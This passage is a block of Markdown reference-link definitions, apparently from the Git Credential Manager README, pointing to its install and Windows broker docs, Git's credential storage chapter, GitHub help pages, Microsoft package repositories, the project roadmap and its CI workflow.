[gcm-windows-broker]: https://github.com/git-ecosystem/git-credential-manager/blob/release/docs/windows-broker.md
[git-tools-credential-storage]: https://git-scm.com/book/en/v2/Git-Tools-Credential-Storage
[github]: https://github.com
[github-ssh]: https://help.github.com/en/articles/connecting-to-github-with-ssh
[github-logos]: https://github.com/logos
[install]: https://github.com/git-ecosystem/git-credential-manager/blob/release/docs/install.md
[ms-package-repos]: https://packages.microsoft.com/repos/
[roadmap]: https://github.com/git-ecosystem/git-credential-manager/milestones?direction=desc&sort=due_date&state=open
[roadmap-announcement]: https://github.com/git-ecosystem/git-credential-manager/discussions/1203
[workflow-status]: https://github.com/git-ecosystem/git-credential-manager/actions/workflows/continuous-integration.yml
